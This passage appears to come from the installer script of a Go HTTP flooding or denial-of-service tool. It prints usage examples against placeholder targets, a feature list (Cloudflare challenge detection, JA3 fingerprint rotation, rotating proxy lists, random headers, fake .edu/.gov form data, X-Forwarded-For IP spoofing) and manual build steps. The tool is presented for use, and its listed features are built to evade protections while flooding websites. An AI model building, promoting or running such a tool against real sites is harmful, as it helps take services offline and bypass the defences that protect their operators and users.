    echo -e "   ${YELLOW}./main https://target.com 30 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.edu 300 MIXED proxy${NC}"
    echo
    echo -e " ${GREEN}Features:${NC}"
    echo -e "   • Automatic Cloudflare challenge detection"
    echo -e "   • HTTP/2 multiplexing support"
    echo -e "   • JA3 fingerprint rotation"
    echo -e "   • Realistic .edu and .gov form data"
    echo -e "   • Auto-refreshing proxy list"
    echo -e "   • Multiple proxy sources"
    echo -e "   • Random header generation"
    echo -e "   • IP spoofing (X-Forwarded-For)"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
